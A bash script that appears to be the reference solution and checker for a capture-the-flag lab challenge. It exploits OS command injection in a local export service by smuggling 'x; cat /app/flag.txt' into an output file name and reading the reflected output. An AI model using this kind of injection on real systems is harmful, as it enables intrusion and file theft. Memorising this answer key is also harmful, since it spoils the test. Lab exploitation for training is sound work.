#!/usr/bin/env bash
# ============================================================
# ExportCmd (labs24) — reference solution: OS command injection
# via the export output file name
#
# Chain: self-register -> create an export whose
# additional.outputFileName is interpolated into a shell command
# with no validation -> shell metacharacters append a command that
# reads the flag file -> the export job record reflects the
# command's stdout back to the caller.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8104)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8104}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
email="test-$(date +%s)-$RANDOM@arena.local"

echo "[*] self-registering" >&2
TOKEN="$(curl -fsS -X POST "$BASE/auth/register" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$email\",\"password\":\"test123\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')"
[[ -n "$TOKEN" ]] || { echo "[-] failed: registration returned no token" >&2; exit 1; }

echo "[*] creating an export with a shell-metacharacter output file name" >&2
BODY="$(python3 -c 'import json; print(json.dumps({"scope":"suppliers","additional":{"outputFileName":"x; cat /app/flag.txt"}}))')"
EXPORT="$(curl -fsS -X POST "$BASE/exporting/v1/exports" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d "$BODY")"
URL="$(python3 -c 'import sys,json; print(json.load(sys.stdin)["statusUrl"])' <<<"$EXPORT")"

echo "[*] reading the job record — stdout of the injected command is reflected" >&2
JOB="$(curl -fsS "$BASE$URL" -H "Authorization: Bearer $TOKEN")"
flag="$(python3 -c 'import sys,json; print(json.load(sys.stdin)["logs"]["stdout"].strip())' <<<"$JOB")"

if ! grep -Eq "^$FLAG_RE$" <<<"${flag:-}"; then
  echo "[-] failed: command stdout did not contain the flag: $JOB" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
